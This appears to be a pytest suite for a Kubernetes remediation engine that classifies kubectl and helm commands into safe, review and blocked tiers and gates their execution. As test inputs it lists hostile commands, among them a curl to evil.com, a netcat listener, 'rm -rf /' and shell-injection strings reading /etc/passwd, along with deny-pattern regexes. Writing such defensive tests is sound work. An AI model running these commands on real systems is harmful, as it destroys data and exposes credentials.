"""Tests for remediation engine foundation types and command classifier.

Covers Task 1 of SPEC-3.1: SafetyTier enum, ClassifiedCommand dataclass,
RemediationConfig defaults/validation, and RemediationExecuted event.

Covers Task 2 of SPEC-3.1: CommandClassifier tier rules, edge cases,
config overrides, and _check_denied_command integration.

Covers Task 3 of SPEC-3.1: RemediationExecutor safety gating, native
dispatch, subprocess dispatch, event emission, and concurrency lock.
"""

from __future__ import annotations

import pytest

from vaig.core.config import RemediationConfig, Settings, reset_settings
from vaig.core.events import RemediationExecuted
from vaig.core.remediation import ClassifiedCommand, CommandClassifier, SafetyTier

# ── SafetyTier enum ────────────────────────────────────────────


class TestSafetyTier:
    """SafetyTier enum values and behaviour."""

    def test_safe_value(self) -> None:
        assert SafetyTier.SAFE == "safe"

    def test_review_value(self) -> None:
        assert SafetyTier.REVIEW == "review"

    def test_blocked_value(self) -> None:
        assert SafetyTier.BLOCKED == "blocked"

    def test_has_exactly_three_members(self) -> None:
        assert len(SafetyTier) == 3

    def test_is_str_enum(self) -> None:
        """SafetyTier values are usable as plain strings."""
        assert isinstance(SafetyTier.SAFE, str)
        assert f"tier={SafetyTier.BLOCKED}" == "tier=blocked"

    def test_from_string(self) -> None:
        """Can construct from raw string value."""
        assert SafetyTier("safe") is SafetyTier.SAFE
        assert SafetyTier("review") is SafetyTier.REVIEW
        assert SafetyTier("blocked") is SafetyTier.BLOCKED

    def test_invalid_value_raises(self) -> None:
        with pytest.raises(ValueError):
            SafetyTier("unknown")


# ── ClassifiedCommand dataclass ────────────────────────────────


class TestClassifiedCommand:
    """ClassifiedCommand frozen dataclass creation and immutability."""

    def test_creation_basic(self) -> None:
        cmd = ClassifiedCommand(
            tool="kubectl",
            subcommand="scale",
            args=("deployment/foo", "--replicas=3"),
            tier=SafetyTier.SAFE,
            raw_command="kubectl scale deployment/foo --replicas=3",
        )
        assert cmd.tool == "kubectl"
        assert cmd.subcommand == "scale"
        assert cmd.args == ("deployment/foo", "--replicas=3")
        assert cmd.tier == SafetyTier.SAFE
        assert cmd.raw_command == "kubectl scale deployment/foo --replicas=3"
        assert cmd.block_reason is None

    def test_creation_with_block_reason(self) -> None:
        cmd = ClassifiedCommand(
            tool="kubectl",
            subcommand="delete",
            args=("namespace/production",),
            tier=SafetyTier.BLOCKED,
            raw_command="kubectl delete namespace/production",
            block_reason="Namespace deletion is never allowed",
        )
        assert cmd.tier == SafetyTier.BLOCKED
        assert cmd.block_reason == "Namespace deletion is never allowed"

    def test_frozen_immutability(self) -> None:
        cmd = ClassifiedCommand(
            tool="helm",
            subcommand="upgrade",
            args=("my-release", "my-chart"),
            tier=SafetyTier.REVIEW,
            raw_command="helm upgrade my-release my-chart",
        )
        with pytest.raises(AttributeError):
            cmd.tier = SafetyTier.SAFE  # type: ignore[misc]

    def test_block_reason_default_none(self) -> None:
        cmd = ClassifiedCommand(
            tool="kubectl",
            subcommand="annotate",
            args=("pod/foo", "key=value"),
            tier=SafetyTier.SAFE,
            raw_command="kubectl annotate pod/foo key=value",
        )
        assert cmd.block_reason is None

    def test_args_is_tuple(self) -> None:
        """Args must be a tuple for immutability."""
        cmd = ClassifiedCommand(
            tool="kubectl",
            subcommand="get",
            args=(),
            tier=SafetyTier.REVIEW,
            raw_command="kubectl get",
        )
        assert isinstance(cmd.args, tuple)


# ── RemediationConfig ──────────────────────────────────────────


class TestRemediationConfig:
    """RemediationConfig Pydantic model defaults and validation."""

    def test_defaults(self) -> None:
        config = RemediationConfig()
        assert config.enabled is False
        assert config.auto_approve_safe is False
        assert config.blocked_commands == []
        assert config.timeout == 30
        assert config.dry_run is False

    def test_custom_values(self) -> None:
        config = RemediationConfig(
            enabled=True,
            auto_approve_safe=True,
            blocked_commands=[r"\brm\b", r"\bdd\b"],
            timeout=60,
            dry_run=True,
        )
        assert config.enabled is True
        assert config.auto_approve_safe is True
        assert config.blocked_commands == [r"\brm\b", r"\bdd\b"]
        assert config.timeout == 60
        assert config.dry_run is True

    def test_blocked_commands_list_type(self) -> None:
        config = RemediationConfig(blocked_commands=["pattern1", "pattern2"])
        assert len(config.blocked_commands) == 2

    def test_feature_flag_disabled_by_default(self) -> None:
        """The enabled flag MUST default to False — opt-in only."""
        config = RemediationConfig()
        assert config.enabled is False


# ── Settings integration ───────────────────────────────────────


class TestRemediationSettingsIntegration:
    """RemediationConfig wired into Settings."""

    def setup_method(self) -> None:
        reset_settings()

    def teardown_method(self) -> None:
        reset_settings()

    def test_settings_has_remediation_field(self) -> None:
        settings = Settings()
        assert hasattr(settings, "remediation")
        assert isinstance(settings.remediation, RemediationConfig)

    def test_settings_remediation_disabled_by_default(self) -> None:
        settings = Settings()
        assert settings.remediation.enabled is False

    def test_settings_remediation_override(self) -> None:
        settings = Settings(remediation=RemediationConfig(enabled=True, timeout=120))
        assert settings.remediation.enabled is True
        assert settings.remediation.timeout == 120


# ── RemediationExecuted event ──────────────────────────────────


class TestRemediationExecuted:
    """RemediationExecuted event dataclass."""

    def test_event_type(self) -> None:
        event = RemediationExecuted()
        assert event.event_type == "remediation.executed"

    def test_creation_with_fields(self) -> None:
        event = RemediationExecuted(
            action_title="Scale deployment",
            command="kubectl scale deployment/foo --replicas=3",
            tier="safe",
            result_output="deployment.apps/foo scaled",
            error="",
            dry_run=False,
            cluster="prod-cluster",
        )
        assert event.action_title == "Scale deployment"
        assert event.command == "kubectl scale deployment/foo --replicas=3"
        assert event.tier == "safe"
        assert event.result_output == "deployment.apps/foo scaled"
        assert event.error == ""
        assert event.dry_run is False
        assert event.cluster == "prod-cluster"

    def test_frozen_immutability(self) -> None:
        event = RemediationExecuted(
            action_title="Test",
            command="kubectl get pods",
            tier="review",
        )
        with pytest.raises(AttributeError):
            event.tier = "safe"  # type: ignore[misc]

    def test_timestamp_auto_populated(self) -> None:
        event = RemediationExecuted()
        assert event.timestamp  # Non-empty ISO 8601 string
        assert "T" in event.timestamp  # ISO 8601 format

    def test_defaults(self) -> None:
        event = RemediationExecuted()
        assert event.action_title == ""
        assert event.command == ""
        assert event.tier == ""
        assert event.result_output == ""
        assert event.error == ""
        assert event.dry_run is False
        assert event.cluster == ""

    def test_event_inherits_from_event_base(self) -> None:
        from vaig.core.events import Event

        event = RemediationExecuted()
        assert isinstance(event, Event)

    def test_in_module_all(self) -> None:
        """RemediationExecuted must be in __all__ for public API."""
        from vaig.core import events

        assert "RemediationExecuted" in events.__all__


# ── RemediationConfig tier_overrides (Task 2 addition) ─────────


class TestRemediationConfigTierOverrides:
    """tier_overrides field added in Task 2."""

    def test_tier_overrides_default_empty(self) -> None:
        config = RemediationConfig()
        assert config.tier_overrides == {}

    def test_tier_overrides_custom(self) -> None:
        config = RemediationConfig(
            tier_overrides={"kubectl rollout restart": "safe", "helm upgrade": "blocked"},
        )
        assert config.tier_overrides == {
            "kubectl rollout restart": "safe",
            "helm upgrade": "blocked",
        }


# ── CommandClassifier ──────────────────────────────────────────


def _make_classifier(
    *,
    blocked_commands: list[str] | None = None,
    tier_overrides: dict[str, str] | None = None,
    coding_denied_commands: list[str] | None = None,
) -> CommandClassifier:
    """Helper to create a classifier with optional config.

    Passes ``coding_denied_commands`` explicitly so tests don't depend on
    ``Settings()`` being loadable (constructor injection).
    """
    config = RemediationConfig(
        blocked_commands=blocked_commands or [],
        tier_overrides=tier_overrides or {},
    )
    return CommandClassifier(config, coding_denied_commands=coding_denied_commands or [])


class TestCommandClassifierSafe:
    """SAFE-tier commands."""

    @pytest.mark.parametrize(
        "command",
        [
            "kubectl annotate pod/foo key=value",
            "kubectl annotate deployment/bar description=test",
            "kubectl label pod/foo env=prod",
            "kubectl label node/bar role=worker",
            "kubectl scale deployment/foo --replicas=3",
            "kubectl scale statefulset/bar --replicas=5",
            "kubectl rollout restart deployment/foo",
            "kubectl rollout status deployment/foo",
            "kubectl get pods",
            "kubectl get pods -n kube-system",
            "kubectl describe pod/foo",
            "kubectl logs pod/foo",
            "kubectl top pods",
        ],
        ids=[
            "annotate-pod",
            "annotate-deployment",
            "label-pod",
            "label-node",
            "scale-deployment",
            "scale-statefulset",
            "rollout-restart",
            "rollout-status",
            "get-pods",
            "get-pods-ns",
            "describe-pod",
            "logs-pod",
            "top-pods",
        ],
    )
    def test_safe_commands(self, command: str) -> None:
        classifier = _make_classifier()
        result = classifier.classify(command)
        assert result.tier == SafetyTier.SAFE, (
            f"Expected SAFE for {command!r}, got {result.tier} "
            f"(reason: {result.block_reason})"
        )

    @pytest.mark.parametrize(
        "command",
        [
            "helm list",
            "helm status my-release",
            "helm get values my-release",
            "helm history my-release",
        ],
        ids=["helm-list", "helm-status", "helm-get", "helm-history"],
    )
    def test_safe_helm_readonly(self, command: str) -> None:
        classifier = _make_classifier()
        result = classifier.classify(command)
        assert result.tier == SafetyTier.SAFE


class TestCommandClassifierReview:
    """REVIEW-tier commands."""

    @pytest.mark.parametrize(
        "command",
        [
            "kubectl apply -f deployment.yaml",
            "kubectl patch deployment/foo -p '{\"spec\": {}}'",
            "kubectl set image deployment/foo container=image:tag",
            "kubectl cordon node/bar",
            "kubectl uncordon node/bar",
            "kubectl drain node/bar",
            "kubectl taint nodes bar key=value:NoSchedule",
            "helm upgrade my-release my-chart",
            "helm upgrade my-release my-chart --set key=value",
            "helm install my-release my-chart",
            "helm rollback my-release 1",
        ],
        ids=[
            "apply-file",
            "patch-deployment",
            "set-image",
            "cordon-node",
            "uncordon-node",
            "drain-node",
            "taint-node",
            "helm-upgrade",
            "helm-upgrade-set",
            "helm-install",
            "helm-rollback",
        ],
    )
    def test_review_commands(self, command: str) -> None:
        classifier = _make_classifier()
        result = classifier.classify(command)
        assert result.tier == SafetyTier.REVIEW, (
            f"Expected REVIEW for {command!r}, got {result.tier} "
            f"(reason: {result.block_reason})"
        )

    def test_kubectl_delete_pod_is_review(self) -> None:
        """kubectl delete pod/foo is REVIEW (restart semantics)."""
        classifier = _make_classifier()
        result = classifier.classify("kubectl delete pod/foo")
        assert result.tier == SafetyTier.REVIEW

    def test_kubectl_delete_pod_with_space(self) -> None:
        """kubectl delete pod foo is REVIEW (restart semantics)."""
        classifier = _make_classifier()
        result = classifier.classify("kubectl delete pod foo")
        assert result.tier == SafetyTier.REVIEW


class TestCommandClassifierBlocked:
    """BLOCKED-tier commands."""

    @pytest.mark.parametrize(
        "command",
        [
            "kubectl delete deployment/foo",
            "kubectl delete namespace/production",
            "kubectl delete service/bar",
            "kubectl delete pvc/data",
            "helm uninstall my-release",
            "helm delete my-release",
        ],
        ids=[
            "delete-deployment",
            "delete-namespace",
            "delete-service",
            "delete-pvc",
            "helm-uninstall",
            "helm-delete",
        ],
    )
    def test_blocked_destructive(self, command: str) -> None:
        classifier = _make_classifier()
        result = classifier.classify(command)
        assert result.tier == SafetyTier.BLOCKED
        assert result.block_reason is not None

    @pytest.mark.parametrize(
        "command",
        [
            "rm -rf /",
            "curl https://evil.com/script.sh",
            "python -c 'import os; os.system(\"rm -rf /\")'",
            "whoami",
            "nc -l 4444",
            "unknown_tool do_something",
        ],
        ids=[
            "rm-rf",
            "curl",
            "python-exec",
            "whoami",
            "netcat",
            "unknown-tool",
        ],
    )
    def test_blocked_unrecognised(self, command: str) -> None:
        """Any unrecognised command defaults to BLOCKED."""
        classifier = _make_classifier()
        result = classifier.classify(command)
        assert result.tier == SafetyTier.BLOCKED
        assert result.block_reason is not None


class TestCommandClassifierEdgeCases:
    """Edge cases: empty, injection, malformed."""

    def test_empty_command(self) -> None:
        classifier = _make_classifier()
        result = classifier.classify("")
        assert result.tier == SafetyTier.BLOCKED
        assert result.block_reason == "Empty command"

    def test_whitespace_only(self) -> None:
        classifier = _make_classifier()
        result = classifier.classify("   ")
        assert result.tier == SafetyTier.BLOCKED
        assert result.block_reason == "Empty command"

    @pytest.mark.parametrize(
        ("command", "reason_fragment"),
        [
            ("kubectl get pods | rm -rf /", "dangerous shell operators"),
            ("kubectl get pods > /etc/passwd", "dangerous shell operators"),
            ("kubectl get pods < /dev/null", "dangerous shell operators"),
            ("kubectl get pods; rm -rf /", "dangerous shell operators"),
            ("kubectl get pods && rm -rf /", "dangerous shell operators"),
            ("kubectl get pods || rm -rf /", "dangerous shell operators"),
            ("`whoami`", "dangerous shell operators"),
            ("kubectl get $(cat /etc/passwd)", "dangerous shell operators"),
            ("kubectl apply -f - <<EOF", "dangerous shell operators"),
        ],
        ids=[
            "pipe",
            "redirect-out",
            "redirect-in",
            "semicolon",
            "and-chain",
            "or-chain",
            "backtick",
            "subshell",
            "heredoc-redirect",
        ],
    )
    def test_shell_injection_blocked(self, command: str, reason_fragment: str) -> None:
        """Commands with shell operators are BLOCKED before any tier check."""
        classifier = _make_classifier()
        result = classifier.classify(command)
        assert result.tier == SafetyTier.BLOCKED
        assert reason_fragment in result.block_reason.lower()

    def test_malformed_quoting(self) -> None:
        """Malformed shlex input → BLOCKED."""
        classifier = _make_classifier()
        result = classifier.classify("kubectl get 'unclosed")
        assert result.tier == SafetyTier.BLOCKED
        assert "Malformed" in result.block_reason

    def test_command_parsing_extracts_tool_subcommand_args(self) -> None:
        """Verify the classifier correctly parses tool, subcommand, args."""
        classifier = _make_classifier()
        result = classifier.classify("kubectl scale deployment/foo --replicas=3")
        assert result.tool == "kubectl"
        assert result.subcommand == "scale"
        assert result.args == ("deployment/foo", "--replicas=3")

    def test_single_word_command_blocked(self) -> None:
        """A single word command with no subcommand → BLOCKED."""
        classifier = _make_classifier()
        result = classifier.classify("kubectl")
        assert result.tier == SafetyTier.BLOCKED
        assert result.tool == "kubectl"
        assert result.subcommand == ""


class TestCommandClassifierConfigOverrides:
    """Config blocked_commands and tier_overrides."""

    def test_config_blocked_commands(self) -> None:
        """Additional blocked patterns from config take precedence."""
        classifier = _make_classifier(blocked_commands=[r"kubectl scale"])
        result = classifier.classify("kubectl scale deployment/foo --replicas=3")
        assert result.tier == SafetyTier.BLOCKED
        assert "blocked pattern" in result.block_reason.lower()

    def test_config_blocked_commands_regex(self) -> None:
        """Config blocked_commands support full regex."""
        classifier = _make_classifier(blocked_commands=[r"--replicas=[6-9]\d+"])
        result = classifier.classify("kubectl scale deployment/foo --replicas=70")
        assert result.tier == SafetyTier.BLOCKED

    def test_tier_override_promote_to_safe(self) -> None:
        """tier_overrides can promote a REVIEW command to SAFE."""
        classifier = _make_classifier(tier_overrides={"helm upgrade": "safe"})
        result = classifier.classify("helm upgrade my-release my-chart")
        assert result.tier == SafetyTier.SAFE

    def test_tier_override_demote_to_blocked(self) -> None:
        """tier_overrides can demote a SAFE command to BLOCKED."""
        classifier = _make_classifier(tier_overrides={"kubectl annotate": "blocked"})
        result = classifier.classify("kubectl annotate pod/foo key=value")
        assert result.tier == SafetyTier.BLOCKED

    def test_tier_override_promote_to_review(self) -> None:
        """tier_overrides can change a BLOCKED to REVIEW."""
        classifier = _make_classifier(
            tier_overrides={"kubectl delete deployment": "review"},
        )
        result = classifier.classify("kubectl delete deployment/foo")
        assert result.tier == SafetyTier.REVIEW

    def test_tier_override_invalid_tier_ignored(self) -> None:
        """Invalid tier names in tier_overrides are silently ignored."""
        classifier = _make_classifier(tier_overrides={"kubectl scale": "invalid_tier"})
        result = classifier.classify("kubectl scale deployment/foo --replicas=3")
        # Falls through to original SAFE tier since invalid override is ignored
        assert result.tier == SafetyTier.SAFE

    def test_tier_override_invalid_regex_ignored(self) -> None:
        """Invalid regex patterns in tier_overrides are silently ignored."""
        classifier = _make_classifier(tier_overrides={"[invalid regex": "safe"})
        result = classifier.classify("kubectl scale deployment/foo --replicas=3")
        assert result.tier == SafetyTier.SAFE


class TestCommandClassifierDeniedIntegration:
    """Integration with _check_denied_command from shell_tools."""

    def test_coding_denied_blocks_command(self) -> None:
        """Commands matching CodingConfig.denied_commands → BLOCKED."""
        classifier = _make_classifier(coding_denied_commands=[r"\bsudo\b"])
        result = classifier.classify("sudo kubectl get pods")
        assert result.tier == SafetyTier.BLOCKED
        assert "blocked pattern" in result.block_reason.lower()

    def test_coding_denied_rm_rf(self) -> None:
        """rm -rf / is blocked by CodingConfig denied_commands."""
        classifier = _make_classifier(
            coding_denied_commands=[r"\brm\s+(-\w*\s+)*-\w*r\w*\s+/\s*$"],
        )
        result = classifier.classify("rm -rf /")
        assert result.tier == SafetyTier.BLOCKED

    def test_settings_exception_continues(self) -> None:
        """When no denied_commands provided, classifier continues normally."""
        classifier = _make_classifier(coding_denied_commands=[])
        result = classifier.classify("kubectl annotate pod/foo key=value")
        assert result.tier == SafetyTier.SAFE


class TestCommandClassifierBlockedBeforeSafe:
    """Verify BLOCKED checks run before SAFE tier rules (order matters)."""

    def test_shell_injection_before_safe_rule(self) -> None:
        """A SAFE command with shell injection is BLOCKED."""
        classifier = _make_classifier()
        result = classifier.classify("kubectl annotate pod/foo key=value | rm -rf /")
        assert result.tier == SafetyTier.BLOCKED

    def test_config_blocked_before_safe_rule(self) -> None:
        """Config blocked_commands checked before tier rules."""
        classifier = _make_classifier(blocked_commands=[r"kubectl annotate"])
        result = classifier.classify("kubectl annotate pod/foo key=value")
        assert result.tier == SafetyTier.BLOCKED

    def test_denied_command_before_safe_rule(self) -> None:
        """shell_tools denied_commands checked before tier rules."""
        classifier = _make_classifier(
            coding_denied_commands=[r"kubectl annotate"],
        )
        result = classifier.classify("kubectl annotate pod/foo key=value")
        assert result.tier == SafetyTier.BLOCKED


# ══════════════════════════════════════════════════════════════
# Task 3 — RemediationExecutor
# ══════════════════════════════════════════════════════════════

import asyncio
from unittest.mock import AsyncMock, patch

from vaig.core.config import GKEConfig
from vaig.core.event_bus import EventBus
from vaig.core.remediation import RemediationExecutor
from vaig.skills.service_health.schema import RecommendedAction
from vaig.tools.base import ToolResult


def _make_action(
    *,
    title: str = "Scale deployment",
    command: str = "kubectl scale deployment/foo --replicas=3",
    risk: str = "Low",
) -> RecommendedAction:
    """Helper to create a RecommendedAction for tests."""
    return RecommendedAction(priority=1, title=title, command=command, risk=risk)


def _make_gke_config(
    *, cluster_name: str = "test-cluster", default_namespace: str = "default",
) -> GKEConfig:
    """Helper to create a GKEConfig for tests."""
    return GKEConfig(cluster_name=cluster_name, default_namespace=default_namespace)


def _make_executor(
    *,
    timeout: int = 30,
    dry_run: bool = False,
) -> tuple[RemediationExecutor, EventBus]:
    """Helper to create an executor and its event bus."""
    config = RemediationConfig(enabled=True, timeout=timeout, dry_run=dry_run)
    bus = EventBus()
    executor = RemediationExecutor(config, bus)
    return executor, bus


# ── validate_context ──────────────────────────────────────────


class TestRemediationExecutorValidateContext:
    """RemediationExecutor.validate_context cluster matching."""

    def test_matching_cluster_returns_true(self) -> None:
        executor, _ = _make_executor()
        gke = _make_gke_config(cluster_name="prod-cluster")
        assert executor.validate_context("prod-cluster", gke) is True

    def test_mismatched_cluster_returns_false(self) -> None:
        executor, _ = _make_executor()
        gke = _make_gke_config(cluster_name="prod-cluster")
        assert executor.validate_context("staging-cluster", gke) is False

    def test_empty_cluster_names(self) -> None:
        executor, _ = _make_executor()
        gke = _make_gke_config(cluster_name="")
        assert executor.validate_context("", gke) is True

    def test_empty_vs_nonempty_cluster(self) -> None:
        executor, _ = _make_executor()
        gke = _make_gke_config(cluster_name="prod-cluster")
        assert executor.validate_context("", gke) is False


# ── BLOCKED commands ──────────────────────────────────────────


class TestRemediationExecutorBlocked:
    """BLOCKED commands emit event and return error ToolResult."""

    @pytest.mark.asyncio
    async def test_blocked_returns_error(self) -> None:
        executor, bus = _make_executor()
        action = _make_action(command="kubectl delete namespace/prod")
        classified = ClassifiedCommand(
            tool="kubectl", subcommand="delete",
            args=("namespace/prod",), tier=SafetyTier.BLOCKED,
            raw_command="kubectl delete namespace/prod",
            block_reason="Namespace deletion is never allowed",
        )
        gke = _make_gke_config()

        result = await executor.execute(action, classified, gke)

        assert result.error is True
        assert "never allowed" in result.output

    @pytest.mark.asyncio
    async def test_blocked_emits_event(self) -> None:
        executor, bus = _make_executor()
        events_received: list[RemediationExecuted] = []
        bus.subscribe(RemediationExecuted, events_received.append)

        action = _make_action(command="helm uninstall release")
        classified = ClassifiedCommand(
            tool="helm", subcommand="uninstall",
            args=("release",), tier=SafetyTier.BLOCKED,
            raw_command="helm uninstall release",
            block_reason="helm uninstall is destructive",
        )
        gke = _make_gke_config()

        await executor.execute(action, classified, gke)

        assert len(events_received) == 1
        event = events_received[0]
        assert event.tier == "blocked"
        assert event.error == "helm uninstall is destructive"
        assert event.cluster == "test-cluster"
        assert event.command == "helm uninstall release"


# ── REVIEW commands ───────────────────────────────────────────


class TestRemediationExecutorReview:
    """REVIEW commands require approval to execute."""

    @pytest.mark.asyncio
    async def test_review_without_approval_returns_plan(self) -> None:
        executor, bus = _make_executor()
        action = _make_action(
            title="Patch deployment",
            command="kubectl patch deployment/foo -p '{}'",
            risk="Medium",
        )
        classified = ClassifiedCommand(
            tool="kubectl", subcommand="patch",
            args=("deployment/foo", "-p", "{}"),
            tier=SafetyTier.REVIEW,
            raw_command="kubectl patch deployment/foo -p '{}'",
        )
        gke = _make_gke_config()

        result = await executor.execute(action, classified, gke, approved=False)

        assert result.error is False
        assert "REVIEW REQUIRED" in result.output
        assert "Patch deployment" in result.output
        assert "Medium" in result.output

    @pytest.mark.asyncio
    async def test_review_without_approval_no_event(self) -> None:
        """No event emitted when REVIEW is not approved (no execution)."""
        executor, bus = _make_executor()
        events_received: list[RemediationExecuted] = []
        bus.subscribe(RemediationExecuted, events_received.append)

        action = _make_action(command="helm upgrade rel chart")
        classified = ClassifiedCommand(
            tool="helm", subcommand="upgrade",
            args=("rel", "chart"), tier=SafetyTier.REVIEW,
            raw_command="helm upgrade rel chart",
        )
        gke = _make_gke_config()

        await executor.execute(action, classified, gke, approved=False)

        assert len(events_received) == 0

    @pytest.mark.asyncio
    async def test_review_with_approval_dispatches(self) -> None:
        """REVIEW + approved=True dispatches via subprocess."""
        executor, bus = _make_executor()
        action = _make_action(command="helm upgrade rel chart")
        classified = ClassifiedCommand(
            tool="helm", subcommand="upgrade",
            args=("rel", "chart"), tier=SafetyTier.REVIEW,
            raw_command="helm upgrade rel chart",
        )
        gke = _make_gke_config()

        mock_result = ToolResult(output="Release upgraded", error=False)
        with patch(
            "vaig.tools.shell_tools.async_run_command",
            new_callable=AsyncMock,
            return_value=mock_result,
        ) as mock_run:
            result = await executor.execute(
                action, classified, gke, approved=True,
            )

        assert result.error is False
        assert result.output == "Release upgraded"
        mock_run.assert_awaited_once()


# ── dry_run ───────────────────────────────────────────────────


class TestRemediationExecutorDryRun:
    """dry_run returns description without executing."""

    @pytest.mark.asyncio
    async def test_dry_run_returns_description(self) -> None:
        executor, bus = _make_executor()
        action = _make_action(title="Scale up", command="kubectl scale deployment/foo --replicas=3")
        classified = ClassifiedCommand(
            tool="kubectl", subcommand="scale",
            args=("deployment/foo", "--replicas=3"),
            tier=SafetyTier.SAFE,
            raw_command="kubectl scale deployment/foo --replicas=3",
        )
        gke = _make_gke_config()

        result = await executor.execute(
            action, classified, gke, dry_run=True, approved=True,
        )

        assert result.error is False
        assert "DRY RUN" in result.output
        assert "kubectl scale deployment/foo --replicas=3" in result.output
        assert "Scale up" in result.output

    @pytest.mark.asyncio
    async def test_dry_run_does_not_dispatch(self) -> None:
        """dry_run should not call any dispatch function."""
        executor, bus = _make_executor()
        action = _make_action()
        classified = ClassifiedCommand(
            tool="kubectl", subcommand="scale",
            args=("deployment/foo", "--replicas=3"),
            tier=SafetyTier.SAFE,
            raw_command="kubectl scale deployment/foo --replicas=3",
        )
        gke = _make_gke_config()

        with patch.object(executor, "_dispatch", new_callable=AsyncMock) as mock_dispatch:
            await executor.execute(
                action, classified, gke, dry_run=True, approved=True,
            )

        mock_dispatch.assert_not_awaited()


# ── Native kubectl dispatch ──────────────────────────────────


class TestRemediationExecutorNativeDispatch:
    """Native kubectl dispatch to mutations async wrappers."""

    @pytest.mark.asyncio
    async def test_kubectl_scale_dispatches_to_native(self) -> None:
        executor, bus = _make_executor()
        action = _make_action(command="kubectl scale deployment/foo --replicas=3")
        classified = ClassifiedCommand(
            tool="kubectl", subcommand="scale",
            args=("deployment/foo", "--replicas=3"),
            tier=SafetyTier.SAFE,
            raw_command="kubectl scale deployment/foo --replicas=3",
        )
        gke = _make_gke_config()

        mock_result = ToolResult(output="deployment.apps/foo scaled to 3", error=False)
        with patch(
            "vaig.tools.gke.mutations.async_kubectl_scale",
            new_callable=AsyncMock,
            return_value=mock_result,
        ) as mock_scale:
            result = await executor.execute(
                action, classified, gke, approved=True,
            )

        assert result.output == "deployment.apps/foo scaled to 3"
        assert result.error is False
        mock_scale.assert_awaited_once_with(
            "deployment", "foo", 3,
            gke_config=gke, namespace="default",
        )

    @pytest.mark.asyncio
    async def test_kubectl_rollout_restart_dispatches_to_native(self) -> None:
        executor, bus = _make_executor()
        action = _make_action(command="kubectl rollout restart deployment/web")
        classified = ClassifiedCommand(
            tool="kubectl", subcommand="rollout",
            args=("restart", "deployment/web"),
            tier=SafetyTier.SAFE,
            raw_command="kubectl rollout restart deployment/web",
        )
        gke = _make_gke_config()

        mock_result = ToolResult(output="deployment.apps/web restarted", error=False)
        with patch(
            "vaig.tools.gke.mutations.async_kubectl_restart",
            new_callable=AsyncMock,
            return_value=mock_result,
        ) as mock_restart:
            result = await executor.execute(
                action, classified, gke, approved=True,
            )

        assert result.output == "deployment.apps/web restarted"
        mock_restart.assert_awaited_once_with(
            "deployment", "web",
            gke_config=gke, namespace="default",
        )

    @pytest.mark.asyncio
    async def test_kubectl_annotate_dispatches_to_native(self) -> None:
        executor, bus = _make_executor()
        action = _make_action(command="kubectl annotate pod/foo key=value")
        classified = ClassifiedCommand(
            tool="kubectl", subcommand="annotate",
            args=("pod/foo", "key=value"),
            tier=SafetyTier.SAFE,
            raw_command="kubectl annotate pod/foo key=value",
        )
        gke = _make_gke_config()

        mock_result = ToolResult(output="pod/foo annotated", error=False)
        with patch(
            "vaig.tools.gke.mutations.async_kubectl_annotate",
            new_callable=AsyncMock,
            return_value=mock_result,
        ) as mock_annotate:
            result = await executor.execute(
                action, classified, gke, approved=True,
            )

        assert result.output == "pod/foo annotated"
        mock_annotate.assert_awaited_once_with(
            "pod", "foo", "key=value",
            gke_config=gke, namespace="default",
        )

    @pytest.mark.asyncio
    async def test_kubectl_label_dispatches_to_native(self) -> None:
        executor, bus = _make_executor()
        action = _make_action(command="kubectl label pod/foo env=prod")
        classified = ClassifiedCommand(
            tool="kubectl", subcommand="label",
            args=("pod/foo", "env=prod"),
            tier=SafetyTier.SAFE,
            raw_command="kubectl label pod/foo env=prod",
        )
        gke = _make_gke_config()

        mock_result = ToolResult(output="pod/foo labeled", error=False)
        with patch(
            "vaig.tools.gke.mutations.async_kubectl_label",
            new_callable=AsyncMock,
            return_value=mock_result,
        ) as mock_label:
            result = await executor.execute(
                action, classified, gke, approved=True,
            )

        assert result.output == "pod/foo labeled"
        mock_label.assert_awaited_once_with(
            "pod", "foo", "env=prod",
            gke_config=gke, namespace="default",
        )


# ── Subprocess dispatch (helm) ────────────────────────────────


class TestRemediationExecutorSubprocess:
    """Subprocess dispatch for helm and non-native commands."""

    @pytest.mark.asyncio
    async def test_helm_dispatches_to_subprocess(self) -> None:
        executor, bus = _make_executor()
        action = _make_action(command="helm upgrade rel chart --set key=val")
        classified = ClassifiedCommand(
            tool="helm", subcommand="upgrade",
            args=("rel", "chart", "--set", "key=val"),
            tier=SafetyTier.REVIEW,
            raw_command="helm upgrade rel chart --set key=val",
        )
        gke = _make_gke_config()

        mock_result = ToolResult(output="Release 'rel' upgraded", error=False)
        with patch(
            "vaig.tools.shell_tools.async_run_command",
            new_callable=AsyncMock,
            return_value=mock_result,
        ) as mock_run:
            result = await executor.execute(
                action, classified, gke, approved=True,
            )

        assert result.output == "Release 'rel' upgraded"
        mock_run.assert_awaited_once_with(
            "helm upgrade rel chart --set key=val",
            workspace=mock_run.call_args.kwargs["workspace"],
            allowed_commands=["helm"],
            timeout=30,
        )


# ── Event emission ────────────────────────────────────────────


class TestRemediationExecutorEvents:
    """Event emission with correct fields on success/failure."""

    @pytest.mark.asyncio
    async def test_event_emitted_on_success(self) -> None:
        executor, bus = _make_executor()
        events_received: list[RemediationExecuted] = []
        bus.subscribe(RemediationExecuted, events_received.append)

        action = _make_action(title="Scale up", command="kubectl scale deployment/foo --replicas=3")
        classified = ClassifiedCommand(
            tool="kubectl", subcommand="scale",
            args=("deployment/foo", "--replicas=3"),
            tier=SafetyTier.SAFE,
            raw_command="kubectl scale deployment/foo --replicas=3",
        )
        gke = _make_gke_config(cluster_name="prod-cluster")

        mock_result = ToolResult(output="scaled to 3", error=False)
        with patch(
            "vaig.tools.gke.mutations.async_kubectl_scale",
            new_callable=AsyncMock,
            return_value=mock_result,
        ):
            await executor.execute(action, classified, gke, approved=True)

        assert len(events_received) == 1
        event = events_received[0]
        assert event.action_title == "Scale up"
        assert event.command == "kubectl scale deployment/foo --replicas=3"
        assert event.tier == "safe"
        assert event.result_output == "scaled to 3"
        assert event.error == ""
        assert event.dry_run is False
        assert event.cluster == "prod-cluster"

    @pytest.mark.asyncio
    async def test_event_emitted_on_dispatch_failure(self) -> None:
        executor, bus = _make_executor()
        events_received: list[RemediationExecuted] = []
        bus.subscribe(RemediationExecuted, events_received.append)

        action = _make_action(title="Scale up")
        classified = ClassifiedCommand(
            tool="kubectl", subcommand="scale",
            args=("deployment/foo", "--replicas=3"),
            tier=SafetyTier.SAFE,
            raw_command="kubectl scale deployment/foo --replicas=3",
        )
        gke = _make_gke_config(cluster_name="prod-cluster")

        with patch(
            "vaig.tools.gke.mutations.async_kubectl_scale",
            new_callable=AsyncMock,
            side_effect=RuntimeError("K8s connection lost"),
        ):
            result = await executor.execute(
                action, classified, gke, approved=True,
            )

        assert result.error is True
